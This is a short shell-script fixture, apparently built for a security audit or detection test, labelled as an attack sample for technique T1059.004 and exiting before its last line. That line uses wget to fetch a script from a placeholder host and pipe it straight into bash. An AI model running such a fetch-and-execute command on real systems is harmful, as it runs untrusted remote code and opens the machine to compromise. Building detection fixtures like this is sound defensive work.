#!/bin/sh
exit 0 # a fixture: read by the audit, never run
# label: attack | technique: T1059.004 | expect: high
wget -qO- http://cdn-update.invalid/i.sh | bash
